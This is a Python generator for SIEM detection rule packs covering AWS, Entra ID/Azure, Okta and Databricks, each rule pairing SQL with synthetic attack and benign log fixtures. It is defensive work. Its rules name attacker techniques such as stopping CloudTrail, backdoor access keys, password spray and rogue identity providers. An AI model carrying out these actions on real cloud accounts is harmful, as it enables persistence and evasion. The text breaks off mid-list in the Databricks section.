"""Generates rule-packs/<pack>/pack.yaml for the AWS, Entra/Azure, Okta, Databricks, Postgres,
ClickHouse and Salesforce packs. Fixtures are raw vendor log records sent through OTLP, so a
canary exercises ingestion, the CIM mapping and the rule together.

    python3 scripts/gen_rule_packs.py        # rewrites the seven pack files
"""
import json
import pathlib

ROOT = pathlib.Path(__file__).resolve().parent.parent
E = "{{entity}}"


def otel(service, body, count=1, offset=1):
    return {"otel": {"service_name": service, "body": body}, "count": count, "offset_minutes": offset}


def rule(rid, name, sev, tactic, tech, table, desc, sql, pos, neg, threshold=1, window=60, fp=None, refs=None):
    r = {"id": rid, "name": name, "description": desc, "severity": sev, "tactic": tactic, "technique": tech,
         "table": table, "threshold": threshold, "window_minutes": window, "lookback_minutes": 240,
         "expected_latency_seconds": 600, "fixtures": {"positive": pos, "negative": neg}, "sql": sql.strip()}
    if fp:
        r["false_positives"] = fp
    if refs:
        r["references"] = refs
    return r


def sel(table, vp, desc, where, extra_from=""):
    return (f"SELECT _time, user_name, src, dest, {desc} AS description\n"
            f"FROM SNOWFLAKE_XDR.RAW_LOGS.{table}{extra_from}\n"
            f"WHERE vendor_product = '{vp}' AND ({where})")


# ------------------------------------------------------------------ AWS (CloudTrail -> CLOUD_API)
def ct(event, source="iam.amazonaws.com", params=None, user=E, utype="IAMUser", ip="198.51.100.30",
       error=None, extra=None):
    b = {"eventName": event, "eventSource": source, "userIdentity": {"type": utype, "userName": user,
         "arn": f"arn:aws:iam::111122223333:user/{user}"}, "sourceIPAddress": ip, "awsRegion": "eu-west-1",
         "recipientAccountId": "111122223333", "requestParameters": params or {}}
    if error:
        b["errorCode"], b["errorMessage"] = error, "User is not authorized to perform this action"
    if extra:
        b.update(extra)
    return b


def aws_fx(event, count=1, **k):
    return otel("aws_cloudtrail", ct(event, **k), count=count)


AWS = {
    "pack_id": "aws", "name": "AWS Account Security", "vendor": "AWS", "version": 1,
    "description": "CloudTrail detections for AWS: root use, logging and guardrail tampering, IAM persistence, "
                   "public exposure of data, snapshot sharing, key destruction and cryptomining bursts.",
    "requires": [{"table": "CLOUD_API", "vendor_product": "aws"}],
    "onboarding": "Ship CloudTrail through the OTel Collector (otel-receiver/collector-examples/cloudtrail.yaml, "
                  "awss3 receiver) with service.name aws_cloudtrail.",
    "rules": [
        rule("AWS-001", "Root account used", 4, "TA0004", "T1078.004", "CLOUD_API",
             "Any API call or console sign-in by the root user.",
             sel("CLOUD_API", "aws", "'Root activity: ' || action || ' from ' || COALESCE(src, '?')",
                 "user_type = 'Root'"),
             [aws_fx("ConsoleLogin", source="signin.amazonaws.com", utype="Root")],
             [aws_fx("ConsoleLogin", source="signin.amazonaws.com", utype="IAMUser")],
             fp="Break-glass procedures (should be rare and announced)."),
        rule("AWS-002", "CloudTrail logging stopped or deleted", 5, "TA0005", "T1562.008", "CLOUD_API",
             "StopLogging, DeleteTrail, UpdateTrail or PutEventSelectors on a trail.",
             sel("CLOUD_API", "aws", "action || ' on ' || COALESCE(object, request_parameters:name::VARCHAR, 'trail')",
                 "result = 'success' AND action IN ('StopLogging', 'DeleteTrail', 'UpdateTrail', 'PutEventSelectors')"),
             [aws_fx("StopLogging", source="cloudtrail.amazonaws.com", params={"name": "org-trail"})],
             [aws_fx("StartLogging", source="cloudtrail.amazonaws.com", params={"name": "org-trail"})]),
        rule("AWS-003", "Security service disabled", 5, "TA0005", "T1562.001", "CLOUD_API",
             "GuardDuty, Security Hub, Config, Access Analyzer or Macie turned off.",
             sel("CLOUD_API", "aws", "'Security service disabled: ' || action",
                 "result = 'success' AND action IN ('DeleteDetector', 'DisableSecurityHub', 'StopConfigurationRecorder', "
                 "'DeleteConfigurationRecorder', 'DeleteDeliveryChannel', 'DeleteAnalyzer', 'DisableMacie', "
                 "'UpdateDetector')"),
             [aws_fx("DeleteDetector", source="guardduty.amazonaws.com", params={"detectorId": "abc"})],
             [aws_fx("GetDetector", source="guardduty.amazonaws.com", params={"detectorId": "abc"})]),
        rule("AWS-004", "Access key created for another user", 4, "TA0003", "T1098.001", "CLOUD_API",
             "CreateAccessKey where the key belongs to a different IAM user than the caller.",
             sel("CLOUD_API", "aws", "'Access key created for ' || request_parameters:userName::VARCHAR || ' by ' || user_name",
                 "result = 'success' AND action = 'CreateAccessKey' AND request_parameters:userName IS NOT NULL "
                 "AND request_parameters:userName::VARCHAR <> user_name"),
             [aws_fx("CreateAccessKey", params={"userName": "svc-backup"})],
             [aws_fx("CreateAccessKey", params={})], fp="Admins rotating service-account keys."),
        rule("AWS-005", "Administrator policy attached", 4, "TA0004", "T1098.003", "CLOUD_API",
             "AdministratorAccess (or a * policy) attached to a user, group or role.",
             sel("CLOUD_API", "aws", "action || ': ' || COALESCE(request_parameters:policyArn::VARCHAR, 'inline policy')",
                 "result = 'success' AND action IN ('AttachUserPolicy', 'AttachRolePolicy', 'AttachGroupPolicy', "
                 "'PutUserPolicy', 'PutRolePolicy', 'PutGroupPolicy') AND (request_parameters:policyArn::VARCHAR ILIKE "
                 "'%AdministratorAccess%' OR REGEXP_LIKE(request_parameters:policyDocument::VARCHAR, "
                 "'.*\"Action\"[[:space:]]*:[[:space:]]*\"[*]\".*', 's'))"),
             [aws_fx("AttachUserPolicy", params={"userName": "temp", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"})],
             [aws_fx("AttachUserPolicy", params={"userName": "temp", "policyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"})]),
        rule("AWS-006", "New IAM user created", 3, "TA0003", "T1136.003", "CLOUD_API",
             "CreateUser or CreateLoginProfile. Backdoor IAM users are a common persistence step.",
             sel("CLOUD_API", "aws", "action || ' for ' || COALESCE(request_parameters:userName::VARCHAR, '?')",
                 "result = 'success' AND action IN ('CreateUser', 'CreateLoginProfile')"),
             [aws_fx("CreateUser", params={"userName": "support-2"})],
             [aws_fx("GetUser", params={"userName": "support-2"})], fp="Identity automation (filter its role)."),
        rule("AWS-007", "Console sign-in without MFA", 3, "TA0001", "T1078.004", "CLOUD_API",
             "Successful ConsoleLogin with MFAUsed = No.",
             sel("CLOUD_API", "aws", "'Console sign-in without MFA from ' || COALESCE(src, '?')",
                 "action = 'ConsoleLogin' AND result = 'success' "
                 "AND TRY_PARSE_JSON(_raw::VARCHAR):additionalEventData:MFAUsed::VARCHAR = 'No'"),
             [aws_fx("ConsoleLogin", source="signin.amazonaws.com", extra={"additionalEventData": {"MFAUsed": "No"}})],
             [aws_fx("ConsoleLogin", source="signin.amazonaws.com", extra={"additionalEventData": {"MFAUsed": "Yes"}})]),
        rule("AWS-008", "S3 bucket exposed publicly", 4, "TA0010", "T1530", "CLOUD_API",
             "Public access block removed, or an ACL / policy granting AllUsers or Principal *.",
             sel("CLOUD_API", "aws", "action || ' on bucket ' || COALESCE(object, '?')",
                 "result = 'success' AND (action = 'DeletePublicAccessBlock' OR (action IN ('PutBucketAcl', "
                 "'PutBucketPolicy') AND (request_parameters::VARCHAR ILIKE '%AllUsers%' OR "
                 "REGEXP_LIKE(request_parameters::VARCHAR, '.*\"Principal\"[^,}]*\"[*]\".*', 's'))))"),
             [aws_fx("DeletePublicAccessBlock", source="s3.amazonaws.com", params={"bucketName": "finance-exports"})],
             [aws_fx("PutBucketAcl", source="s3.amazonaws.com", params={"bucketName": "finance-exports",
                                                                         "x-amz-acl": "private"})]),
        rule("AWS-009", "Snapshot shared with another account", 4, "TA0010", "T1537", "CLOUD_API",
             "EBS or RDS snapshot permissions modified to add an account or all.",
             sel("CLOUD_API", "aws", "action || ': ' || LEFT(request_parameters::VARCHAR, 200)",
                 "result = 'success' AND action IN ('ModifySnapshotAttribute', 'ModifyDBSnapshotAttribute', "
                 "'ModifyDBClusterSnapshotAttribute') AND (request_parameters::VARCHAR ILIKE '%add%' "
                 "OR request_parameters::VARCHAR ILIKE '%valuesToAdd%')"),
             [aws_fx("ModifyDBSnapshotAttribute", source="rds.amazonaws.com",
                     params={"dBSnapshotIdentifier": "prod-db", "attributeName": "restore", "valuesToAdd": ["999988887777"]})],
             [aws_fx("ModifyDBSnapshotAttribute", source="rds.amazonaws.com",
                     params={"dBSnapshotIdentifier": "prod-db", "attributeName": "restore", "valuesToRemove": ["999988887777"]})]),
        rule("AWS-010", "Access-denied burst", 3, "TA0007", "T1580", "CLOUD_API",
             "Fifteen or more AccessDenied / Unauthorized errors for one principal in 10 minutes: permission probing.",
             sel("CLOUD_API", "aws", "'Denied: ' || action",
                 "result = 'failure' AND (reason ILIKE '%not authorized%' OR reason ILIKE '%AccessDenied%' "
                 "OR TRY_PARSE_JSON(_raw::VARCHAR):errorCode::VARCHAR IN ('AccessDenied', 'UnauthorizedOperation', "
                 "'Client.UnauthorizedOperation'))"),
             [aws_fx("ListBuckets", source="s3.amazonaws.com", error="AccessDenied", count=16)],
             [aws_fx("ListBuckets", source="s3.amazonaws.com", error="AccessDenied", count=3)], threshold=15, window=10),
        rule("AWS-011", "KMS key disabled or scheduled for deletion", 4, "TA0040", "T1485", "CLOUD_API",
             "Destroying a KMS key makes data encrypted with it unrecoverable.",
             sel("CLOUD_API", "aws", "action || ' ' || COALESCE(request_parameters:keyId::VARCHAR, '')",
                 "result = 'success' AND action IN ('ScheduleKeyDeletion', 'DisableKey')"),
             [aws_fx("ScheduleKeyDeletion", source="kms.amazonaws.com", params={"keyId": "k-123", "pendingWindowInDays": 7})],
             [aws_fx("EnableKey", source="kms.amazonaws.com", params={"keyId": "k-123"})]),
        rule("AWS-012", "Security group opened to the internet", 3, "TA0005", "T1562.007", "CLOUD_API",
             "Ingress rule from 0.0.0.0/0 or ::/0 added.",
             sel("CLOUD_API", "aws", "'Ingress from anywhere: ' || COALESCE(request_parameters:groupId::VARCHAR, '?')",
                 "result = 'success' AND action = 'AuthorizeSecurityGroupIngress' "
                 "AND (request_parameters::VARCHAR ILIKE '%0.0.0.0/0%' OR request_parameters::VARCHAR ILIKE '%::/0%')"),
             [aws_fx("AuthorizeSecurityGroupIngress", source="ec2.amazonaws.com",
                     params={"groupId": "sg-1", "ipPermissions": {"items": [{"fromPort": 22, "ipRanges": {"items": [{"cidrIp": "0.0.0.0/0"}]}}]}})],
             [aws_fx("AuthorizeSecurityGroupIngress", source="ec2.amazonaws.com",
                     params={"groupId": "sg-1", "ipPermissions": {"items": [{"fromPort": 22, "ipRanges": {"items": [{"cidrIp": "10.0.0.0/8"}]}}]}})]),
        rule("AWS-013", "Burst of instance launches", 3, "TA0040", "T1496", "CLOUD_API",
             "Ten or more RunInstances calls by one principal in 30 minutes: cryptomining pattern.",
             sel("CLOUD_API", "aws", "'RunInstances ' || COALESCE(request_parameters:instanceType::VARCHAR, '')",
                 "result = 'success' AND action = 'RunInstances'"),
             [aws_fx("RunInstances", source="ec2.amazonaws.com", params={"instanceType": "p3.16xlarge"}, count=10)],
             [aws_fx("RunInstances", source="ec2.amazonaws.com", params={"instanceType": "t3.micro"}, count=2)],
             threshold=10, window=30, fp="Autoscaling (filter its role)."),
    ],
}

# ------------------------------------------------------------------ Entra ID + Azure
def signin(err=0, risk="none", client="Browser", ip="198.51.100.40", country="DE", user=E, app="Office 365"):
    return {"category": "SignInLogs", "tenantId": "tenant-1", "properties": {
        "userPrincipalName": f"{user}@contoso.com", "ipAddress": ip, "appDisplayName": app, "clientAppUsed": client,
        "status": {"errorCode": err, "failureReason": None if err == 0 else "error " + str(err)},
        "location": {"countryOrRegion": country, "city": "Berlin"}, "riskLevelDuringSignIn": risk,
        "authenticationRequirement": "singleFactorAuthentication", "resourceDisplayName": "Office 365"}}


def audit(activity, category="RoleManagement", target=None, props=None, result="success"):
    t = {"displayName": target or "victim", "type": "User", "userPrincipalName": f"{target or 'victim'}@contoso.com",
         "modifiedProperties": props or []}
    return {"operationName": activity, "category": "AuditLogs", "tenantId": "tenant-1", "properties": {
        "activityDisplayName": activity, "category": category, "result": result,
        "initiatedBy": {"user": {"userPrincipalName": f"{E}@contoso.com", "ipAddress": "198.51.100.41"}},
        "targetResources": [t]}}


def activity(op, result="Success", provider="Microsoft.Authorization/roleAssignments", props=None):
    return {"operationName": op, "category": "Administrative", "resultType": result, "caller": f"{E}@contoso.com",
            "callerIpAddress": "198.51.100.42", "location": "westeurope",
            "resourceId": f"/subscriptions/sub-1/resourceGroups/rg-prod/providers/{provider}/x1",
            "properties": props or {}}


SI = lambda count=1, offset=1, **k: otel("entra_signin", signin(**k), count=count, offset=offset)
AU = lambda *a, **k: otel("entra_audit", audit(*a, **k))
AZ = lambda *a, **k: otel("azure_activity", activity(*a, **k))

ENTRA = {
    "pack_id": "entra", "name": "Microsoft Entra ID and Azure", "vendor": "Microsoft", "version": 1,
    "description": "Entra ID sign-in and audit detections (risky and legacy sign-ins, spray, MFA fatigue, privileged "
                   "roles, app credentials, consent, Conditional Access and federation tampering) plus Azure "
                   "control-plane abuse (Owner assignments, diagnostic settings, VM run command).",
    "requires": [{"table": "AUTHENTICATION", "vendor_product": "Entra ID"},
                 {"table": "CLOUD_API", "vendor_product": "Entra ID"}, {"table": "CLOUD_API", "vendor_product": "azure"}],
    "onboarding": "Export SignInLogs, AuditLogs and the Activity log to Event Hubs and ship them "
                  "with otel-receiver/collector-examples/entra_azure_forwarder.py, which routes them to service.name entra_signin, entra_audit, "
                  "azure_activity.",
    "rules": [
        rule("ENT-001", "Risky sign-in succeeded", 4, "TA0001", "T1078.004", "AUTHENTICATION",
             "Successful sign-in that Entra ID Protection rated medium or high risk.",
             sel("AUTHENTICATION", "Entra ID", "'Risky sign-in (' || signature || ') to ' || COALESCE(app, '?')",
                 "action = 'success' AND _raw:properties:riskLevelDuringSignIn::VARCHAR IN ('medium', 'high')"),
             [SI(risk="high")], [SI(risk="low")]),
        rule("ENT-002", "Legacy authentication sign-in", 3, "TA0001", "T1078", "AUTHENTICATION",
             "Successful sign-in over a legacy protocol that cannot do MFA (IMAP, POP, SMTP, ActiveSync, other clients).",
             sel("AUTHENTICATION", "Entra ID", "'Legacy auth via ' || user_agent",
                 "action = 'success' AND user_agent IN ('IMAP4', 'POP3', 'Authenticated SMTP', 'Exchange ActiveSync', "
                 "'Other clients', 'Exchange Web Services', 'MAPI Over HTTP')"),
             [SI(client="IMAP4")], [SI(client="Browser")], fp="Old multifunction printers and mail clients."),
        rule("ENT-003", "Entra password spray", 4, "TA0006", "T1110.003", "AUTHENTICATION",
             "One source fails sign-in (50126 invalid credentials) for ten or more users in 30 minutes.",
             "SELECT MAX(_time) AS _time, NULL AS user_name, src, MAX(dest) AS dest,\n"
             "       'Password spray from ' || src || ' against ' || COUNT(DISTINCT user_name) || ' users' AS description\n"
             "FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION\n"
             "WHERE vendor_product = 'Entra ID' AND action = 'failure' AND signature_id = '50126'\n"
             "  AND _time > DATEADD('minute', -240, CURRENT_TIMESTAMP())\n"
             "GROUP BY src, TIME_SLICE(_time::TIMESTAMP_NTZ, 30, 'MINUTE')\nHAVING COUNT(DISTINCT user_name) >= 10",
             [SI(count=12, err=50126, user="spray{{n}}", ip=E)], [SI(count=3, err=50126, user="spray{{n}}", ip=E)]),
        rule("ENT-004", "MFA fatigue", 4, "TA0006", "T1621", "AUTHENTICATION",
             "Five or more MFA denials (500121) for one user in 15 minutes.",
             sel("AUTHENTICATION", "Entra ID", "'MFA denied: ' || COALESCE(reason, '')",
                 "action = 'failure' AND signature_id = '500121'"),
             [SI(count=5, err=500121)], [SI(count=2, err=500121)], threshold=5, window=15),
        rule("ENT-005", "Privileged directory role assigned", 5, "TA0004", "T1098.003", "CLOUD_API",
             "Global Administrator, Privileged Role Administrator or similar role added to a member.",
             sel("CLOUD_API", "Entra ID", "action || ': ' || COALESCE(object, '?') || ' by ' || user_name",
                 "result = 'success' AND action ILIKE 'Add member to role%' AND request_parameters::VARCHAR ILIKE ANY "
                 "('%Global Administrator%', '%Privileged Role Administrator%', '%Privileged Authentication Administrator%', "
                 "'%Application Administrator%', '%Security Administrator%')"),
             [AU("Add member to role", props=[{"displayName": "Role.DisplayName", "newValue": "\"Global Administrator\""}])],
             [AU("Add member to role", props=[{"displayName": "Role.DisplayName", "newValue": "\"Reports Reader\""}])]),
        rule("ENT-006", "Credentials added to an application", 4, "TA0003", "T1098.001", "CLOUD_API",
             "A secret or certificate added to an app registration or service principal.",
             sel("CLOUD_API", "Entra ID", "action || ': ' || COALESCE(object, '?')",
                 "result = 'success' AND (action ILIKE 'Add service principal credentials%' OR (action ILIKE "
                 "'Update application%' AND request_parameters::VARCHAR ILIKE '%KeyDescription%'))"),
             [AU("Add service principal credentials", category="ApplicationManagement", target="payroll-app")],
             [AU("Update application", category="ApplicationManagement", target="payroll-app")]),
        rule("ENT-007", "Consent granted to an application", 3, "TA0006", "T1528", "CLOUD_API",
             "User or admin consent to an OAuth app: illicit consent grants steal mailbox and file access.",
             sel("CLOUD_API", "Entra ID", "'Consent to ' || COALESCE(object, '?')",
                 "result = 'success' AND action ILIKE 'Consent to application%'"),
             [AU("Consent to application", category="ApplicationManagement", target="mail-helper")],
             [AU("Add application", category="ApplicationManagement", target="mail-helper")]),
        rule("ENT-008", "Conditional Access policy changed or deleted", 4, "TA0005", "T1562.001", "CLOUD_API",
             "Changes to Conditional Access can silently remove MFA or location controls.",
             sel("CLOUD_API", "Entra ID", "action || ': ' || COALESCE(object, '?')",
                 "result = 'success' AND (action ILIKE 'Update conditional access policy%' "
                 "OR action ILIKE 'Delete conditional access policy%')"),
             [AU("Delete conditional access policy", category="Policy", target="Require MFA for admins")],
             [AU("Add conditional access policy", category="Policy", target="Require MFA for admins")]),
        rule("ENT-009", "Domain federation changed", 5, "TA0005", "T1484.002", "CLOUD_API",
             "Federation or domain authentication settings changed (Golden SAML / rogue IdP).",
             sel("CLOUD_API", "Entra ID", "action || ': ' || COALESCE(object, '?')",
                 "result = 'success' AND (action ILIKE 'Set federation settings on domain%' OR action ILIKE "
                 "'Set domain authentication%' OR action ILIKE 'Add unverified domain%')"),
             [AU("Set federation settings on domain", category="DirectoryManagement", target="contoso.com")],
             [AU("Verify domain", category="DirectoryManagement", target="contoso.com")]),
        rule("ENT-010", "Azure Owner or User Access Administrator assigned", 4, "TA0004", "T1098.003", "CLOUD_API",
             "Role assignment write at subscription or resource-group scope.",
             sel("CLOUD_API", "azure", "'Role assignment by ' || user_name || ' on ' || COALESCE(object, '?')",
                 "result = 'success' AND action = 'MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE'"),
             [AZ("MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE")],
             [AZ("MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE", result="Failure")], fp="IaC pipelines (filter the SP)."),
        rule("ENT-011", "Azure diagnostic settings deleted", 4, "TA0005", "T1562.008", "CLOUD_API",
             "Removing diagnostic settings stops logs reaching the SIEM.",
             sel("CLOUD_API", "azure", "'Diagnostic settings deleted on ' || COALESCE(object, '?')",
                 "result = 'success' AND action = 'MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE'"),
             [AZ("MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE", provider="Microsoft.Insights/diagnosticSettings")],
             [AZ("MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/WRITE", provider="Microsoft.Insights/diagnosticSettings")]),
        rule("ENT-012", "VM run command executed", 4, "TA0002", "T1651", "CLOUD_API",
             "Run Command executes scripts as SYSTEM/root on a VM from the control plane.",
             sel("CLOUD_API", "azure", "'Run command on ' || COALESCE(object, '?')",
                 "result = 'success' AND action IN ('MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION', "
                 "'MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMANDS/WRITE')"),
             [AZ("MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION", provider="Microsoft.Compute/virtualMachines")],
             [AZ("MICROSOFT.COMPUTE/VIRTUALMACHINES/RESTART/ACTION", provider="Microsoft.Compute/virtualMachines")]),
    ],
}

# ------------------------------------------------------------------ Okta
def okta(event, result="SUCCESS", user=E, ip="198.51.100.50", country="United States", target=None, ttype="User",
         reason=None):
    return {"eventType": event, "displayMessage": event, "actor": {"alternateId": f"{user}@corp.example", "type": "User",
            "id": "00u1"}, "client": {"ipAddress": ip, "geographicalContext": {"country": country, "city": "X"},
            "userAgent": {"rawUserAgent": "Mozilla/5.0"}}, "outcome": {"result": result, "reason": reason},
            "authenticationContext": {"credentialType": "PASSWORD"},
            "target": [{"alternateId": target or "victim@corp.example", "displayName": target or "victim", "type": ttype}]}


OK = lambda event, count=1, offset=1, **k: otel("okta", okta(event, **k), count=count, offset=offset)

OKTA = {
    "pack_id": "okta", "name": "Okta Identity", "vendor": "Okta", "version": 1,
    "description": "Okta System Log detections: MFA factor tampering, admin privilege grants, API tokens, policy "
                   "weakening, push fatigue, brute force, new-country sessions, ThreatInsight, IdP changes, impersonation.",
    "requires": [{"table": "AUTHENTICATION", "vendor_product": "Okta"}, {"table": "CLOUD_API", "vendor_product": "Okta"}],
    "onboarding": "Run otel-receiver/collector-examples/okta_forwarder.py (polls /api/v1/logs) with service.name okta.",
    "rules": [
        rule("OKTA-001", "MFA factor reset or removed", 3, "TA0003", "T1556.006", "CLOUD_API",
             "A user's MFA factors were deactivated or reset: attackers re-enrol their own factor.",
             sel("CLOUD_API", "Okta", "action || ' for ' || COALESCE(object, '?') || ' by ' || user_name",
                 "result = 'success' AND action IN ('user.mfa.factor.deactivate', 'user.mfa.factor.reset_all')"),
             [OK("user.mfa.factor.reset_all")], [OK("user.mfa.factor.activate")], fp="Help-desk resets for lost phones."),
        rule("OKTA-002", "Admin privilege granted", 5, "TA0004", "T1098.003", "CLOUD_API",
             "Administrator role granted to a user or group.",
             sel("CLOUD_API", "Okta", "action || ' to ' || COALESCE(object, '?') || ' by ' || user_name",
                 "result = 'success' AND action IN ('user.account.privilege.grant', 'group.privilege.grant')"),
             [OK("user.account.privilege.grant")], [OK("user.account.privilege.revoke")]),
        rule("OKTA-003", "API token created", 4, "TA0003", "T1098.001", "CLOUD_API",
             "Okta API tokens act with the creator's admin rights and survive password resets.",
             sel("CLOUD_API", "Okta", "'API token created by ' || user_name",
                 "result = 'success' AND action = 'system.api_token.create'"),
             [OK("system.api_token.create", target="token-ci", ttype="Token")],
             [OK("system.api_token.revoke", target="token-ci", ttype="Token")]),
        rule("OKTA-004", "Sign-on policy weakened", 4, "TA0005", "T1556", "CLOUD_API",
             "A sign-on or MFA policy or rule was deactivated or deleted.",
             sel("CLOUD_API", "Okta", "action || ': ' || COALESCE(object, '?')",
                 "result = 'success' AND action IN ('policy.lifecycle.deactivate', 'policy.lifecycle.delete', "
                 "'policy.rule.deactivate', 'policy.rule.delete')"),
             [OK("policy.rule.deactivate", target="Require MFA", ttype="PolicyRule")],
             [OK("policy.rule.activate", target="Require MFA", ttype="PolicyRule")]),
        rule("OKTA-005", "Okta Verify push fatigue", 4, "TA0006", "T1621", "CLOUD_API",
             "Five or more denied or failed push verifications for one user in 15 minutes.",
             sel("CLOUD_API", "Okta", "'Push rejected: ' || action",
                 "(action = 'user.mfa.okta_verify.deny_push' OR (action = 'system.push.send_factor_verify_push' "
                 "AND result = 'failure'))"),
             [OK("user.mfa.okta_verify.deny_push", count=5)], [OK("user.mfa.okta_verify.deny_push", count=2)],
             threshold=5, window=15),
        rule("OKTA-006", "Okta brute force", 3, "TA0006", "T1110", "AUTHENTICATION",
             "Ten or more failed Okta sign-ins for one user from one source in 15 minutes.",
             sel("AUTHENTICATION", "Okta", "'Failed Okta sign-in: ' || COALESCE(reason, '')",
                 "action = 'failure' AND signature_id = 'user.session.start'"),
             [OK("user.session.start", result="FAILURE", reason="INVALID_CREDENTIALS", count=10)],
             [OK("user.session.start", result="FAILURE", reason="INVALID_CREDENTIALS", count=3)], threshold=10, window=15),
        rule("OKTA-007", "Okta session from a new country", 3, "TA0001", "T1078.004", "AUTHENTICATION",
             "Successful sign-in from a country the user has not signed in from in 30 days.",
             "SELECT n._time, n.user_name, n.src, n.dest,\n"
             "       'Okta sign-in from new country ' || n.geo_country AS description\n"
             "FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION n\n"
             "WHERE n.vendor_product = 'Okta' AND n.action = 'success' AND n.geo_country IS NOT NULL\n"
             "  AND n._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())\n"
             "  AND EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION h WHERE h.vendor_product = 'Okta'\n"
             "              AND h.user_name = n.user_name AND h.action = 'success'\n"
             "              AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('day', -1, n._time))\n"
             "  AND NOT EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION h WHERE h.vendor_product = 'Okta'\n"
             "              AND h.user_name = n.user_name AND h.action = 'success' AND h.geo_country = n.geo_country\n"
             "              AND h._time BETWEEN DATEADD('day', -30, n._time) AND DATEADD('minute', -240, CURRENT_TIMESTAMP()))",
             [OK("user.session.start", offset=7200, country="United States"), OK("user.session.start", country="Nigeria")],
             [OK("user.session.start", offset=7200, country="United States"), OK("user.session.start", country="United States")],
             fp="Travel."),
        rule("OKTA-008", "Okta ThreatInsight or user-reported suspicious activity", 4, "TA0001", "T1078", "CLOUD_API",
             "Okta flagged a threat, or a user reported activity they did not recognise.",
             sel("CLOUD_API", "Okta", "action || ' from ' || COALESCE(src, '?')",
                 "action IN ('security.threat.detected', 'user.account.report_suspicious_activity_by_enduser', "
                 "'security.attack.start')"),
             [OK("user.account.report_suspicious_activity_by_enduser")], [OK("user.account.update_profile")]),
        rule("OKTA-009", "Identity provider created or changed", 5, "TA0005", "T1484.002", "CLOUD_API",
             "A new or modified IdP can mint sessions for any user (cross-tenant impersonation).",
             sel("CLOUD_API", "Okta", "action || ': ' || COALESCE(object, '?')",
                 "result = 'success' AND action IN ('system.idp.lifecycle.create', 'system.idp.lifecycle.update', "
                 "'system.idp.lifecycle.activate')"),
             [OK("system.idp.lifecycle.create", target="rogue-idp", ttype="IdentityProvider")],
             [OK("system.idp.lifecycle.read", target="rogue-idp", ttype="IdentityProvider")]),
        rule("OKTA-010", "Admin impersonation session", 4, "TA0004", "T1078", "AUTHENTICATION",
             "Okta support or an admin started an impersonation session.",
             sel("AUTHENTICATION", "Okta", "'Impersonation session: ' || COALESCE(signature, '')",
                 "signature_id = 'user.session.impersonation.initiate'"),
             [OK("user.session.impersonation.initiate")], [OK("user.session.end")]),
    ],
}

# ------------------------------------------------------------------ Databricks
def dbx(service, action, params=None, status=200, user=E, ip="198.51.100.60"):
    return {"serviceName": service, "actionName": action, "userIdentity": {"email": f"{user}@corp.example"},
            "sourceIPAddress": ip, "userAgent": "databricks-cli", "requestParams": params or {},
            "response": {"statusCode": status, "errorMessage": None if status < 300 else "denied"},
            "workspaceId": "1234567890", "accountId": "acc-1"}


DB = lambda service, action, count=1, **k: otel("databricks", dbx(service, action, **k), count=count)

DATABRICKS = {
    "pack_id": "databricks", "name": "Databricks Workspace Security", "vendor": "Databricks", "version": 1,
    "description": "Databricks audit-log detections: admin group changes, tokens, IP access lists, verbose audit "
                   "logging, large result downloads, secret harvesting, login failures, broad Unity Catalog grants "
                   "and Delta Sharing to new recipients.",
    "requires": [{"table": "DATABASE_ACTIVITY", "vendor_product": "databricks"}],
    "onboarding": "Read system.access.audit (or audit log delivery) with otel-receiver/collector-examples/"
                  "databricks_forwarder.py, service.name databricks.",
    "rules": [
        rule("DBX-001", "User added to the admins group", 5, "TA0004", "T1098.003", "DATABASE_ACTIVITY",
             "A principal was added to the workspace or account admins group.",
             sel("DATABASE_ACTIVITY", "databricks", "'Added to admins by ' || user_name || ': ' || LEFT(query_text, 150)",
                 "result = 'success' AND action = 'addPrincipalToGroup' AND (object ILIKE 'admins' "
                 "OR query_text ILIKE '%\"admins\"%')"),
             [DB("groups", "addPrincipalToGroup", params={"targetGroupName": "admins", "targetUserName": "eve"})],
             [DB("groups", "addPrincipalToGroup", params={"targetGroupName": "analysts", "targetUserName": "eve"})]),
        rule("DBX-002", "Personal access token created", 3, "TA0003", "T1098.001", "DATABASE_ACTIVITY",
             "PATs give long-lived API access and bypass SSO.",
             sel("DATABASE_ACTIVITY", "databricks", "'Token created: ' || query_type",
                 "result = 'success' AND action IN ('generateDbToken', 'createToken', 'createOboToken')"),
             [DB("accounts", "generateDbToken", params={"lifetime_seconds": 0})],
             [DB("accounts", "tokenLogin")], fp="Service principals for CI."),
        rule("DBX-003", "IP access lists disabled or removed", 4, "TA0005", "T1562.007", "DATABASE_ACTIVITY",
             "Workspace IP access lists turned off or deleted.",
             sel("DATABASE_ACTIVITY", "databricks", "query_type || ': ' || LEFT(query_text, 150)",
                 "result = 'success' AND ((action = 'workspaceConfEdit' AND query_text ILIKE '%enableIpAccessLists%' "
                 "AND query_text ILIKE '%false%') OR query_type ILIKE 'ipAccessLists.delete%')"),
             [DB("workspace", "workspaceConfEdit", params={"workspaceConfKeys": "enableIpAccessLists", "workspaceConfValues": "false"})],
             [DB("workspace", "workspaceConfEdit", params={"workspaceConfKeys": "enableIpAccessLists", "workspaceConfValues": "true"})]),
        rule("DBX-004", "Large result download", 3, "TA0010", "T1567", "DATABASE_ACTIVITY",
             "Notebook or SQL query results downloaded as files.",
             sel("DATABASE_ACTIVITY", "databricks", "'Download: ' || query_type",
                 "result = 'success' AND action IN ('downloadLargeResults', 'downloadQueryResult', 'downloadPreviewResults')"),
             [DB("notebook", "downloadLargeResults", params={"notebookId": "42"})],
             [DB("notebook", "runCommand", params={"notebookId": "42"})]),
